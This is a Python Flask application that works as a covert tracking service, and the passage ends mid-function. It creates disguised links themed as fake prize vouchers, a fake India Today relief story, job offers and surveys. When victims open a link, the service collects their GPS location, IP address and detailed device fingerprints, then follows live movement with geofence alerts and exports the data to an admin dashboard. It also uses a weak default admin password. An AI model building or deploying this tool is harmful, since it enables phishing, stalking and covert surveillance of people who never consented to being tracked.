import os
import uuid
import math
import csv
import io
import threading
import time
import urllib.request
from datetime import datetime, timedelta
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, stream_with_context, Response, abort
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

# Render free-tier keep-alive self-pinger task
def keep_alive():
    url = os.environ.get('RENDER_EXTERNAL_URL')
    if not url:
        return
    ping_url = f"{url.rstrip('/')}/ping"
    print(f"Self-pinger daemon started targeting: {ping_url}")
    while True:
        # Sleep for 10 minutes (600 seconds)
        time.sleep(600)
        try:
            with urllib.request.urlopen(ping_url, timeout=15) as response:
                response.read()
            print("Self-ping successful. Render instance kept awake!")
        except Exception as e:
            print(f"Keep-alive self-ping failed: {e}")

# Security configuration
app.secret_key = os.environ.get('SECRET_KEY', 'changethis_to_random_string')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')

DATABASE_URL = os.environ.get('DATABASE_URL', 'sqlite:///tracker.db')
# Fix for Render PostgreSQL URL (uses postgres:// but SQLAlchemy needs postgresql://)
if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)
app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Database Models
class TrackingLink(db.Model):
    __tablename__ = 'tracking_links'
    id = db.Column(db.Integer, primary_key=True)
    link_id = db.Column(db.String(36), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    label = db.Column(db.String(100), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    visit_count = db.Column(db.Integer, default=0)
    is_active = db.Column(db.Boolean, default=True)
    theme = db.Column(db.String(50), default='gift')
    custom_slug = db.Column(db.String(100), unique=True, nullable=True)

class LocationEntry(db.Model):
    __tablename__ = 'location_entries'
    id = db.Column(db.Integer, primary_key=True)
    link_id = db.Column(db.String(36), db.ForeignKey('tracking_links.link_id', ondelete='CASCADE'), nullable=False)
    latitude = db.Column(db.Float, nullable=True)
    longitude = db.Column(db.Float, nullable=True)
    accuracy = db.Column(db.Float, nullable=True)
    altitude = db.Column(db.Float, nullable=True)
    city = db.Column(db.String(255), nullable=True)
    address = db.Column(db.Text, nullable=True)
    ip_address = db.Column(db.String(45), nullable=False)
    user_agent = db.Column(db.Text, nullable=False)
    platform = db.Column(db.String(100), nullable=False)
    screen_resolution = db.Column(db.String(50), nullable=False)
    language = db.Column(db.String(50), nullable=False)
    location_denied = db.Column(db.Boolean, default=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Device fingerprint fields
    timezone = db.Column(db.String(100), nullable=True)
    timezone_offset = db.Column(db.Integer, nullable=True)
    cpu_cores = db.Column(db.Integer, nullable=True)
    device_memory = db.Column(db.Float, nullable=True)
    touch_points = db.Column(db.Integer, nullable=True)
    battery_level = db.Column(db.Float, nullable=True)
    battery_charging = db.Column(db.Boolean, nullable=True)
    connection_type = db.Column(db.String(50), nullable=True)
    canvas_fingerprint = db.Column(db.String(100), nullable=True)
    webgl_vendor = db.Column(db.String(200), nullable=True)
    webgl_renderer = db.Column(db.String(200), nullable=True)
    fonts_detected = db.Column(db.String(500), nullable=True)
    audio_inputs = db.Column(db.Integer, nullable=True)
    video_inputs = db.Column(db.Integer, nullable=True)
    is_mobile = db.Column(db.Boolean, nullable=True)
    is_tablet = db.Column(db.Boolean, nullable=True)
    screen_color_depth = db.Column(db.Integer, nullable=True)
    viewport = db.Column(db.String(50), nullable=True)
    prefers_dark_mode = db.Column(db.Boolean, nullable=True)
    cookies_enabled = db.Column(db.Boolean, nullable=True)
    plugins_count = db.Column(db.Integer, nullable=True)
    
    # Live tracking fields
    session_id = db.Column(db.String(100), nullable=True)
    is_live_update = db.Column(db.Boolean, default=False, nullable=True)
    update_number = db.Column(db.Integer, default=1, nullable=True)
    ip_source = db.Column(db.String(50), nullable=True)

class Geofence(db.Model):
    __tablename__ = 'geofences'
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    latitude = db.Column(db.Float, nullable=False)
    longitude = db.Column(db.Float, nullable=False)
    radius_meters = db.Column(db.Float, nullable=False)
    is_active = db.Column(db.Boolean, default=True, nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    alert_on_enter = db.Column(db.Boolean, default=True, nullable=True)
    alert_on_exit = db.Column(db.Boolean, default=True, nullable=True)

class GeofenceAlert(db.Model):
    __tablename__ = 'geofence_alerts'
    id = db.Column(db.Integer, primary_key=True)
    geofence_id = db.Column(db.Integer, db.ForeignKey('geofences.id', ondelete='CASCADE'), nullable=False)
    session_id = db.Column(db.String(100), nullable=False)
    alert_type = db.Column(db.String(10), nullable=False) # 'ENTER' or 'EXIT'
    latitude = db.Column(db.Float, nullable=False)
    longitude = db.Column(db.Float, nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    is_read = db.Column(db.Boolean, default=False, nullable=True)

def require_login(f):
    from functools import wraps
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or request.path.startswith('/api/'):
                return jsonify({'error': 'Unauthorized'}), 401
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# Browser UA Parser logic
def parse_browser(user_agent):
    if not user_agent:
        return 'Other'
    if 'Chrome' in user_agent and 'Edg' not in user_agent:
        return 'Chrome'
    elif 'Firefox' in user_agent:
        return 'Firefox'
    elif 'Safari' in user_agent and 'Chrome' not in user_agent:
        return 'Safari'
    elif 'Edg' in user_agent:
        return 'Edge'
    elif 'Opera' in user_agent or 'OPR' in user_agent:
        return 'Opera'
    else:
        return 'Other'

# Haversine distance formula
def haversine(lat1, lon1, lat2, lon2):
    R = 6371000  # radius of Earth in meters
    phi1, phi2 = math.radians(lat1), math.radians(lat2)
    dphi = math.radians(lat2 - lat1)
    dlambda = math.radians(lon2 - lon1)
    a = math.sin(dphi/2)**2 + math.cos(phi1)*math.cos(phi2)*math.sin(dlambda/2)**2
    return R * 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))

def total_distance(points):
    total = 0.0
    for i in range(1, len(points)):
        total += haversine(points[i-1].latitude, points[i-1].longitude, points[i].latitude, points[i].longitude)
    return total

def check_geofences_for_entry(entry):
    if entry.location_denied or not entry.latitude or not entry.longitude:
        return False
    
    active_geofences = Geofence.query.filter_by(is_active=True).all()
    if not active_geofences:
        return False
    
    # Find the previous entry in this session to check transition
    prev_entry = LocationEntry.query.filter(
        LocationEntry.session_id == entry.session_id,
        LocationEntry.id != entry.id,
        LocationEntry.latitude != None,
        LocationEntry.longitude != None
    ).order_by(LocationEntry.timestamp.desc()).first()
    
    triggered = False
    for gf in active_geofences:
        curr_dist = haversine(gf.latitude, gf.longitude, entry.latitude, entry.longitude)
        curr_inside = curr_dist <= gf.radius_meters
        
        if prev_entry:
            prev_dist = haversine(gf.latitude, gf.longitude, prev_entry.latitude, prev_entry.longitude)
            prev_inside = prev_dist <= gf.radius_meters
        else:
            prev_inside = False
        
        alert_type = None
        if curr_inside and not prev_inside and gf.alert_on_enter:
            alert_type = 'ENTER'
        elif not curr_inside and prev_inside and gf.alert_on_exit:
            alert_type = 'EXIT'
            
        if alert_type:
            alert = GeofenceAlert(
                geofence_id=gf.id,
                session_id=entry.session_id,
                alert_type=alert_type,
                latitude=entry.latitude,
                longitude=entry.longitude
            )
            db.session.add(alert)
            triggered = True
            
    if triggered:
        db.session.commit()
    return triggered

# Routes
@app.route('/ping')
def ping():
    return jsonify({'status': 'alive'}), 200

@app.route('/')
def index():
    return redirect(url_for('admin'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if session.get('logged_in'):
        return redirect(url_for('admin'))
    
    error = None
    if request.method == 'POST':
        password = request.form.get('password')
        if password == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('admin'))
        else:
            error = 'Invalid Password'
            
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/admin')
@require_login
def admin():
    return render_template('admin.html')

@app.route('/analytics')
@require_login
def analytics():
    return render_template('analytics.html')

@app.route('/geofence')
@require_login
def geofence_page():
    return render_template('geofence.html')

OG_THEMES = {
  'gift': {
    'title': '🎁 You Have Been Selected! Claim Your Prize',
    'description': 'Congratulations! You have won an exclusive ₹5000 gift voucher. Claim now before it expires!',
    'image': 'https://viutck.onrender.com/static/og/gift.jpg',
    'site_name': 'Gift Voucher Portal'
  },
  'news': {
    'title': 'Breaking: Government Announces ₹10,000 Relief for Citizens',
    'description': 'Read the full story about the new scheme announced today. Check if you are eligible.',
    'image': 'https://viutck.onrender.com/static/og/news.jpg',
    'site_name': 'India Today Breaking News'
  },
  'job': {
    'title': '💼 Job Opening: ₹25 LPA | Apply Now',
    'description': 'TechCorp India is hiring Senior Engineers. Limited seats. Apply before deadline.',
    'image': 'https://viutck.onrender.com/static/og/job.jpg',
    'site_name': 'TechCorp Careers'
  },
  'survey': {
    'title': '📋 Complete Survey — Win ₹1000 Amazon Voucher',
    'description': 'Takes only 2 minutes. 500 winners selected daily. Participate now!',
    'image': 'https://viutck.onrender.com/static/og/survey.jpg',
    'site_name': 'Survey Rewards India'
  },
  'loading': {
    'title': '▶️ Exclusive Video — Members Only Content',
    'description': 'Watch this exclusive video shared with you. Available for limited time only.',
    'image': 'https://viutck.onrender.com/static/og/video.jpg',
    'site_name': 'Video Portal'
  }
}

@app.route('/static/og/<theme>.jpg')
def og_image(theme):
  # Return a redirect to a relevant placeholder image
  images = {
    'gift': 'https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop',
    'news': 'https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=1200&h=630&fit=crop',
    'job': 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=1200&h=630&fit=crop',
    'survey': 'https://images.unsplash.com/photo-1586281380349-632531db7ed4?w=1200&h=630&fit=crop',
    'loading': 'https://images.unsplash.com/photo-1611162616305-c69b3fa7fbe0?w=1200&h=630&fit=crop'
  }
  from flask import redirect
  return redirect(images.get(theme, images['gift']))

@app.route('/t/<path:link_id>')
def serve_tracking(link_id):
    link = TrackingLink.query.filter_by(custom_slug=link_id, is_active=True).first()
    if not link:
        link = TrackingLink.query.filter_by(link_id=link_id, is_active=True).first()
    if not link:
        abort(404)
    
    link.visit_count += 1
    db.session.commit()
    import copy
    og_data = copy.deepcopy(OG_THEMES.get(link.theme or 'gift', OG_THEMES['gift']))
    host_url = request.host_url.rstrip('/')
    og_data['image'] = og_data['image'].replace('https://viutck.onrender.com', host_url)
    og_data['url'] = request.url
    return render_template('track.html', link_id=link.link_id, theme=link.theme, og=og_data)

@app.route('/api/track/<link_id>', methods=['POST'])
def track_user(link_id):
    link = TrackingLink.query.filter_by(link_id=link_id).first_or_404()
    if not link.is_active:
        return jsonify({'error': 'Link inactive'}), 403
    
    data = request.json or {}
    session_id = data.get('session_id')
    
    entry = LocationEntry(
        link_id=link_id,
        latitude=data.get('latitude'),
        longitude=data.get('longitude'),
        accuracy=data.get('accuracy'),
        altitude=data.get('altitude'),
        city=data.get('city'),
        address=data.get('address'),
        ip_address=data.get('ip_address', request.remote_addr),
        user_agent=data.get('user_agent', request.user_agent.string or 'Unknown'),
        platform=data.get('platform', 'Unknown'),
        screen_resolution=data.get('screen_resolution', 'Unknown'),
        language=data.get('language', 'Unknown'),
        location_denied=data.get('location_denied', False),
        ip_source=data.get('ip_source'),
        
        # Fingerprint columns
        timezone=data.get('timezone'),
        timezone_offset=data.get('timezone_offset'),
        cpu_cores=data.get('cpu_cores'),
        device_memory=data.get('device_memory'),
        touch_points=data.get('touch_points'),
        battery_level=data.get('battery_level'),
        battery_charging=data.get('battery_charging'),
        connection_type=data.get('connection_type'),
        canvas_fingerprint=data.get('canvas_fingerprint'),
        webgl_vendor=data.get('webgl_vendor'),
        webgl_renderer=data.get('webgl_renderer'),
        fonts_detected=data.get('fonts_detected'),
        audio_inputs=data.get('audio_inputs'),
        video_inputs=data.get('video_inputs'),
        is_mobile=data.get('is_mobile'),
        is_tablet=data.get('is_tablet'),
        screen_color_depth=data.get('screen_color_depth'),
        viewport=data.get('viewport'),
        prefers_dark_mode=data.get('prefers_dark_mode'),
        cookies_enabled=data.get('cookies_enabled'),
        plugins_count=data.get('plugins_count'),
        
        # Live/session columns
        session_id=session_id,
        is_live_update=False,
        update_number=1
    )
    
    db.session.add(entry)
    db.session.commit()
    
    # Check geofences
    geofence_triggered = check_geofences_for_entry(entry)
    
    return jsonify({
        'status': 'success',
        'geofence_triggered': geofence_triggered
    })

@app.route('/api/track/live/<link_id>', methods=['POST'])
def track_user_live(link_id):
    link = TrackingLink.query.filter_by(link_id=link_id).first_or_404()
    if not link.is_active:
        return jsonify({'error': 'Link inactive'}), 403
    
    data = request.json or {}
    session_id = data.get('session_id')
    if not session_id:
        return jsonify({'error': 'Session ID is required'}), 400
        
    # Get next update number
    max_update = db.session.query(db.func.max(LocationEntry.update_number)).filter_by(session_id=session_id).scalar()
    update_num = (max_update or 0) + 1
    
    entry = LocationEntry(
        link_id=link_id,
        latitude=data.get('latitude'),
        longitude=data.get('longitude'),
        accuracy=data.get('accuracy'),
        altitude=data.get('altitude'),
        city=data.get('city'),
        address=data.get('address'),
        ip_address=data.get('ip_address', request.remote_addr),
        user_agent=data.get('user_agent', request.user_agent.string or 'Unknown'),
        platform=data.get('platform', 'Unknown'),
        screen_resolution=data.get('screen_resolution', 'Unknown'),
        language=data.get('language', 'Unknown'),
        location_denied=data.get('location_denied', False),
        ip_source=data.get('ip_source'),
        
        # Fingerprint columns
        timezone=data.get('timezone'),
        timezone_offset=data.get('timezone_offset'),
        cpu_cores=data.get('cpu_cores'),
        device_memory=data.get('device_memory'),
        touch_points=data.get('touch_points'),
        battery_level=data.get('battery_level'),
        battery_charging=data.get('battery_charging'),
        connection_type=data.get('connection_type'),
        canvas_fingerprint=data.get('canvas_fingerprint'),
        webgl_vendor=data.get('webgl_vendor'),
        webgl_renderer=data.get('webgl_renderer'),
        fonts_detected=data.get('fonts_detected'),
        audio_inputs=data.get('audio_inputs'),
        video_inputs=data.get('video_inputs'),
        is_mobile=data.get('is_mobile'),
        is_tablet=data.get('is_tablet'),
        screen_color_depth=data.get('screen_color_depth'),
        viewport=data.get('viewport'),
        prefers_dark_mode=data.get('prefers_dark_mode'),
        cookies_enabled=data.get('cookies_enabled'),
        plugins_count=data.get('plugins_count'),
        
        # Live columns
        session_id=session_id,
        is_live_update=True,
        update_number=update_num
    )
    
    db.session.add(entry)
    db.session.commit()
    
    # Check geofences
    geofence_triggered = check_geofences_for_entry(entry)
    
    return jsonify({
        'status': 'success',
        'geofence_triggered': geofence_triggered
    })

@app.route('/api/live/sessions')
@require_login
def live_sessions():
    threshold = datetime.utcnow() - timedelta(seconds=60)
    recent_entries = LocationEntry.query.filter(
        LocationEntry.session_id != None,
        LocationEntry.timestamp >= threshold
    ).all()
    
    sessions_map = {}
    for entry in recent_entries:
        link = TrackingLink.query.filter_by(link_id=entry.link_id).first()
        label = link.label if link else 'Deleted Link'
        
        if entry.session_id not in sessions_map or entry.timestamp > sessions_map[entry.session_id]['timestamp_raw']:
            sessions_map[entry.session_id] = {
                'session_id': entry.session_id,
                'label': label,
                'timestamp': entry.timestamp.strftime('%Y-%m-%d %H:%M:%S'),
                'timestamp_raw': entry.timestamp,
                'city': entry.city or 'Unknown',
                'battery_level': entry.battery_level,
                'ip_address': entry.ip_address,
                'platform': entry.platform
            }
            
    return jsonify(list(sessions_map.values()))

@app.route('/api/live/path/<session_id>')
@require_login
def live_path(session_id):
    entries = LocationEntry.query.filter_by(session_id=session_id).order_by(LocationEntry.timestamp.asc()).all()
    result = []
    for entry in entries:
        result.append({
            'latitude': entry.latitude,
            'longitude': entry.longitude,
            'accuracy': entry.accuracy,
            'timestamp': entry.timestamp.strftime('%Y-%m-%d %H:%M:%S'),
            'battery_level': entry.battery_level,
            'city': entry.city
        })
    return jsonify(result)

@app.route('/api/session/<session_id>/path')
@require_login
def session_path(session_id):
    entries = LocationEntry.query.filter_by(session_id=session_id).order_by(LocationEntry.timestamp.asc()).all()
    result = []
    for entry in entries:
        result.append({
            'latitude': entry.latitude,
            'longitude': entry.longitude,
            'accuracy': entry.accuracy,
            'timestamp': entry.timestamp.strftime('%Y-%m-%d %H:%M:%S'),
            'battery_level': entry.battery_level,
            'city': entry.city,
            'address': entry.address
        })
    return jsonify(result)

@app.route('/api/session/<session_id>/stats')
@require_login
def session_stats(session_id):
    entries = LocationEntry.query.filter(
        LocationEntry.session_id == session_id,
        LocationEntry.latitude != None,
        LocationEntry.longitude != None
    ).order_by(LocationEntry.timestamp.asc()).all()
    
    if not entries:
        return jsonify({
            'total_distance': 0.0,
            'duration_seconds': 0,
            'avg_speed_kmh': 0.0,
            'point_count': 0
        })
        
    dist = total_distance(entries)
    duration = (entries[-1].timestamp - entries[0].timestamp).total_seconds()
    
    avg_speed = 0.0
    if duration > 0:
        avg_speed = (dist / duration) * 3.6
        
    return jsonify({
        'total_distance': round(dist, 1),
        'duration_seconds': int(duration),
        'avg_speed_kmh': round(avg_speed, 2),
        'point_count': len(entries)
    })

@app.route('/api/locations')
@require_login
def api_locations():
    entries = LocationEntry.query.order_by(LocationEntry.timestamp.desc()).all()
    result = []
    for entry in entries:
        link = TrackingLink.query.filter_by(link_id=entry.link_id).first()
        label = link.label if link else 'Deleted Link'
        result.append({
            'id': entry.id,
            'link_id': entry.link_id,
            'label': label,
            'latitude': entry.latitude,
            'longitude': entry.longitude,
            'accuracy': entry.accuracy,
            'altitude': entry.altitude,
            'city': entry.city,
            'address': entry.address,
            'ip_address': entry.ip_address,
            'user_agent': entry.user_agent,
            'platform': entry.platform,
            'screen_resolution': entry.screen_resolution,
            'language': entry.language,
            'location_denied': entry.location_denied,
            'timestamp': entry.timestamp.strftime('%Y-%m-%d %H:%M:%S'),
            
            # Fingerprint fields
            'timezone': entry.timezone,
            'timezone_offset': entry.timezone_offset,
            'cpu_cores': entry.cpu_cores,
            'device_memory': entry.device_memory,
            'touch_points': entry.touch_points,
            'battery_level': entry.battery_level,
            'battery_charging': entry.battery_charging,
            'connection_type': entry.connection_type,
            'canvas_fingerprint': entry.canvas_fingerprint,
            'webgl_vendor': entry.webgl_vendor,
            'webgl_renderer': entry.webgl_renderer,
            'fonts_detected': entry.fonts_detected,
            'audio_inputs': entry.audio_inputs,
            'video_inputs': entry.video_inputs,
            'is_mobile': entry.is_mobile,
            'is_tablet': entry.is_tablet,
            'screen_color_depth': entry.screen_color_depth,
            'viewport': entry.viewport,
            'prefers_dark_mode': entry.prefers_dark_mode,
            'cookies_enabled': entry.cookies_enabled,
            'plugins_count': entry.plugins_count,
            
            # Live fields
            'session_id': entry.session_id,
            'is_live_update': entry.is_live_update,
            'update_number': entry.update_number,
            'ip_source': entry.ip_source
        })
    return jsonify(result)

@app.route('/api/links')
@require_login
def api_links():
    links = TrackingLink.query.order_by(TrackingLink.created_at.desc()).all()
    result = [{
        'id': link.id,
        'link_id': link.link_id,
        'label': link.label,
        'created_at': link.created_at.strftime('%Y-%m-%d %H:%M:%S'),
        'visit_count': link.visit_count,
        'is_active': link.is_active,
        'theme': link.theme,
        'custom_slug': link.custom_slug
    } for link in links]
    return jsonify(result)

@app.route('/api/links/generate', methods=['POST'])
@require_login
def generate_link():
    data = request.json or {}
    label = data.get('label')
    theme = data.get('theme', 'gift')
    custom_slug = data.get('custom_slug')
    
    if not label:
        return jsonify({'error': 'Label is required'}), 400
    
    if custom_slug:
        custom_slug = custom_slug.strip()
        import re
        if not re.match(r'^[a-zA-Z0-9\-]+$', custom_slug) or len(custom_slug) > 30:
            return jsonify({'error': 'Slug must be alphanumeric & hyphens only, max 30 chars'}), 400
        
        existing = TrackingLink.query.filter_by(custom_slug=custom_slug).first()
        if existing:
            return jsonify({'error': 'Slug already taken, try another'}), 400
    else:
        custom_slug = None
        
    link = TrackingLink(
        link_id=str(uuid.uuid4()),
        label=label,
        theme=theme,
        custom_slug=custom_slug
    )
    db.session.add(link)
    db.session.commit()
    return jsonify({
        'id': link.id,
        'link_id': link.link_id,
        'label': link.label,
        'created_at': link.created_at.strftime('%Y-%m-%d %H:%M:%S'),
        'visit_count': link.visit_count,
        'is_active': link.is_active,
        'theme': link.theme,
        'custom_slug': link.custom_slug
    })

@app.route('/api/check-slug/<slug>')
@require_login
def check_slug(slug):
    import re
    if not re.match(r'^[a-zA-Z0-9\-]+$', slug) or len(slug) > 30:
        return jsonify({'available': False, 'error': 'Invalid format'}), 400
    link = TrackingLink.query.filter_by(custom_slug=slug).first()
    return jsonify({'available': link is None})

@app.route('/api/links/<link_id>', methods=['DELETE', 'PUT'])
@require_login
def manage_link(link_id):
    link = TrackingLink.query.filter_by(link_id=link_id).first_or_404()
    if request.method == 'DELETE':
        LocationEntry.query.filter_by(link_id=link_id).delete()
        db.session.delete(link)
        db.session.commit()
        return jsonify({'status': 'deleted'})
    elif request.method == 'PUT':
        data = request.json or {}
        if 'is_active' in data:
            link.is_active = data['is_active']
            db.session.commit()
        return jsonify({
            'link_id': link.link_id,
            'is_active': link.is_active
        })

@app.route('/api/locations/<int:loc_id>', methods=['DELETE'])
@require_login
def delete_location(loc_id):
    entry = LocationEntry.query.get_or_404(loc_id)
    db.session.delete(entry)
    db.session.commit()
    return jsonify({'status': 'deleted'})

@app.route('/api/stats')
@require_login
def api_stats():
    total_locations = LocationEntry.query.count()
    total_links = TrackingLink.query.count()
    active_links = TrackingLink.query.filter_by(is_active=True).count()
    return jsonify({
        'total_locations': total_locations,
        'total_links': total_links,
        'active_links': active_links
    })

@app.route('/api/analytics')
@require_login
def api_analytics():
    total_locations = LocationEntry.query.count()
    total_links = TrackingLink.query.count()
    
    now = datetime.utcnow()
    today_start = now.replace(hour=0, minute=0, second=0, microsecond=0)
    week_start = now - timedelta(days=7)
    
    locations_today = LocationEntry.query.filter(LocationEntry.timestamp >= today_start).count()
    locations_this_week = LocationEntry.query.filter(LocationEntry.timestamp >= week_start).count()
    
    denied_count = LocationEntry.query.filter_by(location_denied=True).count()
    allowed_count = LocationEntry.query.filter_by(location_denied=False).count()
    
    all_entries = LocationEntry.query.all()
    
    country_counts = {}
    city_counts = {}
    for entry in all_entries:
        if entry.address:
            parts = [p.strip() for p in entry.address.split(',')]
            if parts:
                country = parts[-1]
                country_counts[country] = country_counts.get(country, 0) + 1
        
        if entry.city:
            city_counts[entry.city] = city_counts.get(entry.city, 0) + 1
        elif entry.address:
            parts = [p.strip() for p in entry.address.split(',')]
            if parts:
                city_counts[parts[0]] = city_counts.get(parts[0], 0) + 1
                
    by_country = [{"name": name, "count": count} for name, count in sorted(country_counts.items(), key=lambda x: x[1], reverse=True)]
    by_city = [{"name": name, "count": count} for name, count in sorted(city_counts.items(), key=lambda x: x[1], reverse=True)[:10]]
    
    mobile_c = LocationEntry.query.filter_by(is_mobile=True).count()
    tablet_c = LocationEntry.query.filter_by(is_tablet=True).count()
    desktop_c = LocationEntry.query.filter(LocationEntry.is_mobile == False, LocationEntry.is_tablet == False).count()
    by_device_type = {"mobile": mobile_c, "tablet": tablet_c, "desktop": desktop_c}
    
    browser_counts = {}
    for entry in all_entries:
        browser = parse_browser(entry.user_agent)
        browser_counts[browser] = browser_counts.get(browser, 0) + 1
    by_browser = [{"name": name, "count": count} for name, count in sorted(browser_counts.items(), key=lambda x: x[1], reverse=True)]
    
    conn_counts = {}
    for entry in all_entries:
        conn = entry.connection_type or 'Unknown'
        conn_counts[conn] = conn_counts.get(conn, 0) + 1
    by_connection = [{"name": name, "count": count} for name, count in sorted(conn_counts.items(), key=lambda x: x[1], reverse=True)]
    
    hour_counts = {h: 0 for h in range(24)}
    for entry in all_entries:
        hour = entry.timestamp.hour
        hour_counts[hour] += 1
    by_hour = [{"hour": h, "count": count} for h, count in hour_counts.items()]
    
    date_counts = {}
    for i in range(14):
        d = (now - timedelta(days=i)).strftime('%Y-%m-%d')
        date_counts[d] = 0
    for entry in all_entries:
        d = entry.timestamp.strftime('%Y-%m-%d')
        if d in date_counts:
            date_counts[d] += 1
    by_date = [{"date": d, "count": count} for d, count in sorted(date_counts.items())]
    
    allowed_entries_with_acc = LocationEntry.query.filter(LocationEntry.location_denied == False, LocationEntry.accuracy != None).all()
    avg_accuracy = sum(e.accuracy for e in allowed_entries_with_acc) / len(allowed_entries_with_acc) if allowed_entries_with_acc else 0.0
    
    mobile_percentage = (mobile_c / total_locations * 100) if total_locations > 0 else 0.0
    permission_rate = (allowed_count / total_locations * 100) if total_locations > 0 else 0.0
    
    links = TrackingLink.query.order_by(TrackingLink.visit_count.desc()).all()
    top_links = []
    for link in links:
        captures = LocationEntry.query.filter_by(link_id=link.link_id).count()
        top_links.append({
            'label': link.label,
            'visits': link.visit_count,
            'captures': captures
        })
        
    recent_entries = LocationEntry.query.order_by(LocationEntry.timestamp.desc()).limit(5).all()
    recent_locations = []
    for entry in recent_entries:
        link = TrackingLink.query.filter_by(link_id=entry.link_id).first()
        label = link.label if link else 'Deleted Link'
        recent_locations.append({
            'id': entry.id,
            'label': label,
            'city': entry.city,
            'ip_address': entry.ip_address,
            'platform': entry.platform,
            'user_agent': entry.user_agent,
            'location_denied': entry.location_denied,
            'timestamp': entry.timestamp.strftime('%Y-%m-%d %H:%M:%S'),
            'is_mobile': entry.is_mobile,
            'connection_type': entry.connection_type,
            'cpu_cores': entry.cpu_cores,
            'device_memory': entry.device_memory
        })
        
    return jsonify({
        'total_locations': total_locations,
        'total_links': total_links,
        'locations_today': locations_today,
        'locations_this_week': locations_this_week,
        'denied_count': denied_count,
        'allowed_count': allowed_count,
        'by_country': by_country,
        'by_city': by_city,
        'by_device_type': by_device_type,
        'by_browser': by_browser,
        'by_connection': by_connection,
        'by_hour': by_hour,
        'by_date': by_date,
        'avg_accuracy': round(avg_accuracy, 1),
        'mobile_percentage': round(mobile_percentage, 1),
        'permission_rate': round(permission_rate, 1),
        'top_links': top_links,
        'recent_locations': recent_locations
    })

# Geofence Routes
@app.route('/api/geofences', methods=['GET', 'POST'])
@require_login
def api_geofences():
    if request.method == 'GET':
        gfs = Geofence.query.order_by(Geofence.created_at.desc()).all()
        result = [{
            'id': gf.id,
            'name': gf.name,
            'latitude': gf.latitude,
            'longitude': gf.longitude,
            'radius_meters': gf.radius_meters,
            'is_active': gf.is_active,
            'alert_on_enter': gf.alert_on_enter,
            'alert_on_exit': gf.alert_on_exit
        } for gf in gfs]
        return jsonify(result)
    
    elif request.method == 'POST':
        data = request.json or {}
        name = data.get('name')
        lat = data.get('latitude')
        lng = data.get('longitude')
        radius = data.get('radius_meters')
        
        if not name or lat is None or lng is None or radius is None:
            return jsonify({'error': 'All fields are required'}), 400
            
        gf = Geofence(
            name=name,
            latitude=lat,
            longitude=lng,
            radius_meters=radius,
            alert_on_enter=data.get('alert_on_enter', True),
            alert_on_exit=data.get('alert_on_exit', True)
        )
        db.session.add(gf)
        db.session.commit()
        
        return jsonify({
            'id': gf.id,
            'name': gf.name,
            'latitude': gf.latitude,
            'longitude': gf.longitude,
            'radius_meters': gf.radius_meters,
            'is_active': gf.is_active
        })

@app.route('/api/geofences/<int:gf_id>', methods=['DELETE'])
@require_login
def delete_geofence(gf_id):
    gf = Geofence.query.get_or_404(gf_id)
    GeofenceAlert.query.filter_by(geofence_id=gf_id).delete()
    db.session.delete(gf)
    db.session.commit()
    return jsonify({'status': 'deleted'})

@app.route('/api/geofences/<int:gf_id>/toggle', methods=['PUT'])
@require_login
def toggle_geofence(gf_id):
    gf = Geofence.query.get_or_404(gf_id)
    data = request.json or {}
    if 'is_active' in data:
        gf.is_active = data['is_active']
        db.session.commit()
    return jsonify({
        'id': gf.id,
        'is_active': gf.is_active
    })

@app.route('/api/geofence-alerts', methods=['GET'])
@require_login
def api_geofence_alerts():
    alerts = GeofenceAlert.query.order_by(GeofenceAlert.timestamp.desc()).all()
    result = []
    for alert in alerts:
        gf = Geofence.query.get(alert.geofence_id)
        gf_name = gf.name if gf else 'Deleted Geofence'
        result.append({
            'id': alert.id,
            'geofence_id': alert.geofence_id,
            'geofence_name': gf_name,
            'session_id': alert.session_id,
            'alert_type': alert.alert_type,
            'latitude': alert.latitude,
            'longitude': alert.longitude,
            'timestamp': alert.timestamp.strftime('%Y-%m-%d %H:%M:%S'),
            'is_read': alert.is_read
        })
    return jsonify(result)

@app.route('/api/geofence-alerts/<int:alert_id>/read', methods=['POST'])
@require_login
def read_geofence_alert(alert_id):
    alert = GeofenceAlert.query.get_or_404(alert_id)
    alert.is_read = True
    db.session.commit()
    return jsonify({'status': 'success'})

@app.route('/api/export/csv')
def export_csv():
    if not session.get('logged_in'):
        return redirect('/login')
    def generate():
        data = io.StringIO()
        writer = csv.writer(data)
        writer.writerow(['ID', 'Link Label', 'Time', 'Latitude', 'Longitude', 'City', 'Address', 'IP Address', 'Device', 'Platform', 'Accuracy', 'Is Mobile', 'Browser', 'Session ID', 'Update Number'])
        for entry in LocationEntry.query.order_by(LocationEntry.timestamp.desc()).all():
            link = TrackingLink.query.filter_by(link_id=entry.link_id).first()
            writer.writerow([entry.id, link.label if link else 'N/A', entry.timestamp, entry.latitude, entry.longitude, entry.city, entry.address, entry.ip_address, entry.user_agent[:50] if entry.user_agent else '', entry.platform, entry.accuracy, entry.is_mobile, parse_browser(entry.user_agent or ''), entry.session_id, entry.update_number])
            yield data.getvalue()
            data.seek(0)
            data.truncate(0)
